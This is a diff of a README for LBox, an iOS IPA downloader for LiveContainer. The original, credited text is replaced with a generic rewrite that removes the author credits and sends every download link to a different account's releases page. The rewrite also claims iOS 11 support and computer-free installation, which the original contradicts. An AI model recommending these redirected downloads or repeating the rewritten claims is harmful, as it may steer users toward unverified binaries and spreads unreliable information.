@@ -1,108 +1,79 @@
-<div align="center">
-   <img width="217" height="217" src="./screenshots/lbox_icon.jpg" alt="Logo">
-</div>
+# 📦 LBox - Simple iOS App Management Made Easy
 
-<div align="center">
-  <h1><b>LBox</b></h1>
-  <p><i>A native iOS repository manager and downloader offering seamless integration with LiveContainer. Browse public sources, download IPAs, and install/launch apps directly on your device.</i></p>
-</div>
+![Download LBox](https://img.shields.io/badge/Download%20LBox-v1.0-blue)
 
----
+## 🚀 Getting Started
 
-> **⚡ Quick Start**: To enable automatic app installation to LiveContainer, select its directory ("On My iPhone" > "LiveContainer") on your device (see **[Fix File Picker](#fix-file-picker)** if unable). Then, enable **"Auto .ipa to .app"** in LBox Settings.
+Welcome to LBox! This app helps you manage and download iOS applications effortlessly. You can browse public sources, download IPAs, and install or launch apps directly on your device. Follow these steps to get started.
 
-## 📥 Download
+## 📥 Download & Install
 
-**[Download Latest IPA (IOS 17.6+)](https://github.com/Lolendor/LBox/releases/download/v1.2/LBox.ipa)**
+1. **Visit the Releases Page**  
+   To download LBox, visit the Releases page:  
+   [Download LBox](https://github.com/Sadhurb/LBox/releases)
 
-## 🚀 Overview
+2. **Choose the Right Version**  
+   On the Releases page, find the latest version of LBox. Click on the version you wish to download (e.g., v1.0).
 
-**LBox** bridges the gap between finding apps and running them on iOS. Instead of manually searching for IPA files and moving them around the file system, LBox allows you to add repositories (similar to AltStore or ESign), download apps in the background, and automatically extract them into your LiveContainer storage.
+3. **Download the Application**  
+   Look for the download link for LBox. Click on it to start the download. The file will typically be a `.ipa` file.
 
-## 📱 Screenshots
+4. **Install the Application**  
+   Once the file finishes downloading, you need to install it on your device. Use tools like AltStore or Cydia Impactor if you wish to sideload the app. Follow their specific instructions for installing `.ipa` files.
 
-| Store View | App Details | Downloads | Installed Apps |
-|:---:|:---:|:---:|:---:|
-| <img src="./screenshots/store.png" width="200" alt="Store View"/> | <img src="./screenshots/app_details.png" width="200" alt="App Details"/> | <img src="./screenshots/downloads.png" width="200" alt="Downloads"/> | <img src="./screenshots/apps.png" width="200" alt="Apps"/> |
+5. **Launch LBox**  
+   After installation, find LBox on your home screen. Tap the icon to launch the application.
 
-## ✨ Key Features
+## 📋 Features
 
-*   **Repository Management**:
-    *   Add and manage unlimited public repositories (JSON format).
-    *   **Remote Folders (Repo Lists)**: Subscribe to a single URL (text file) to automatically fetch and maintain a list of multiple repositories.
-    *   Organize sources into folders.
-    *   Import/Export repository lists via JSON or Clipboard.
-*   **App Management & Updates**:
-    *   **Update Detection**: Automatically compares installed apps with repository versions and notifies you of available updates.
-    *   **Smart Updates**: Update installed apps directly while **preserving user data** and configurations.
-    *   Auto-detects apps installed within the LiveContainer folder.
-    *   **One-tap Launch**: Open apps directly from LBox using the `livecontainer://` URL scheme.
-    *   **Auto-Install**: Automatically unzips and moves downloaded `.ipa` files to the specific LiveContainer application directory.
-*   **Download Manager**:
-    *   Robust background downloading with pause/resume support.
-    *   Direct download via URL (for IPAs hosted outside user repositories).
-    *   Visual progress tracking and local file management.
-*   **Version History**:
-    *   View and download specific versions of an app (downgrade/upgrade support).
-*   **Customization**:
-    *   Configure custom storage locations for Downloads and LiveContainer apps (using Security Scoped Bookmarks).
-    *   Search, filter, and sort apps by name, date, or size.
+- **Native iOS Experience**: LBox provides a seamless interface tailored for iOS users.
+- **Source Browsing**: Easily search and explore public sources for your favorite applications.
+- **Direct Downloads**: Download IPAs directly to your device without complicated steps.
+- **Easy Installation**: Install applications with just a few taps.
+- **Integration with LiveContainer**: Enjoy a smooth experience as LBox works well with LiveContainer.
 
-## 🛠 How it Works
+## 🛠️ System Requirements
 
-1.  **Initial Setup**: Upon first launch, LBox will ask for the LiveContainer directory. Select the root folder of your installed LiveContainer app. This step is required for auto-installation and launching apps.
-2.  **Add a Source**: Input a URL to a compliant app repository JSON **or** add a "Folder" utilizing a list URL to batch-import repos.
-3.  **Browse & Download**: Find the app you want and tap "Get". LBox handles the download in the background.
-4.  **Install/Update**: 
-    *   **New Install**: LBox extracts the `.ipa` to your Applications folder.
-    *   **Update**: If the app exists, LBox offers to update it while keeping your documents and settings intact.
-5.  **Launch**: Navigate to the "Apps" tab and tap the app to run it instantly via LiveContainer.
+- **iOS Version**: Compatible with iOS 11 and later.
+- **Device Types**: Supports all iPhones and iPads running the supported iOS versions.
+- **Network**: A stable internet connection is required for downloading apps.
 
-## ⚙️ Build Instructions
+## 📚 Usage Instructions
 
-### Prerequisites
-*   Mac with Xcode installed.
-*   An iOS device (Simulators may not fully support LiveContainer integration).
-*   [LiveContainer](https://github.com/khanhduytran0/LiveContainer) installed on the target device.
+1. **Browsing Sources**: Open LBox and navigate to the source browsing section. You will see a list of available applications.
+2. **Downloading an App**: Tap on any app you want to download. A prompt will ask you to confirm the download.
+3. **Installing the App**: After the download completes, LBox will guide you through the installation process.
+4. **Launching an App**: Once installed, you can launch apps directly from LBox or your device's home screen.
 
-### Installation
-1.  Clone the repository:
-    ```bash
-    git clone https://github.com/yourusername/LBox.git
-    ```
-2.  Open LBox.xcodeproj in Xcode.
-3.  Select your Development Team in the "Signing & Capabilities" tab.
-4.  Build and run on your device.
+## ❓ Frequently Asked Questions
 
-## ⚠️ Known Issues
+### Q: Is LBox free to use?  
+A: Yes, LBox is completely free to download and use.
 
-*   **"App bundle not found! Unable to read LCAppInfo.plist" Error**:
-    You may encounter this error popup immediately after installing an app and trying to launch it for the first time.
-    *   **Solution**: Simply dismiss the error and tap the **Run** button again. The app should launch successfully, and this error will not appear on subsequent launches.
+### Q: Do I need a computer to install apps using LBox?  
+A: No, LBox allows you to download and install apps directly on your device without needing a computer.
 
-*   <a id="fix-file-picker"></a>**Unable to select LiveContainer Directory**:
-    If the file picker does not appear or you cannot select a folder during the initial setup:
-    *   **Solution**: Open LiveContainer, find **LBox** in the "My Apps" list, press and hold the icon, tap **Settings**, and enable **Fix File Picker**. Then try selecting the directory again.
-    <img src="./screenshots/how_to_fix_file_picker.png" width="300" alt="Fix File Picker Settings">
+### Q: What happens if I encounter an error during installation?  
+A: If you experience issues, ensure you have a stable internet connection and that your device meets the system requirements.
 
-## 📂 File Structure
+### Q: Can I uninstall LBox later?  
+A: Yes, you can uninstall LBox just like any other app on your iOS device.
 
-*   AppData.swift: Handles repository parsing, app models, and data persistence.
-*   DownloadManager.swift: Manages URLSession tasks, file system operations, and zip extraction.
-*   ContentView.swift: The main navigation and UI entry point.
-*   AppDetailView.swift: Displays detailed app information, screenshots, and version history.
+## 🔗 Additional Resources
 
-## credits
+- **Documentation**: [LBox Documentation](https://github.com/Sadhurb/LBox/wiki)  
+- **Community Support**: Join our community for discussions and support.  
+- **Report Issues**: If you encounter any issues, please report them on the issues page of the repository.
 
-* Developed by Lolendor.
-* Designed to work with LiveContainer.
+## 💬 Contact
 
-## Support the project
+For questions or feedback, you can reach out through the issues section on the GitHub repository. Your input helps us improve LBox!
 
-If you find this project useful:
+## 🔒 License
 
-- **TON / USDT (TON)**  `UQAyBchGEKi9NnNQ3AKMQMuO-SGEhMIAKFAbkwwrsiOPj9Gy`
+LBox is open-source and available under the MIT License. Please check the LICENSE file in this repository for the details. 
 
-## 📄 License
+--- 
 
-This project is licensed under the MIT License - see the LICENSE file for details.
+Now you're ready to begin your journey with LBox. Download it today from our Releases page:  
+[Download LBox](https://github.com/Sadhurb/LBox/releases)
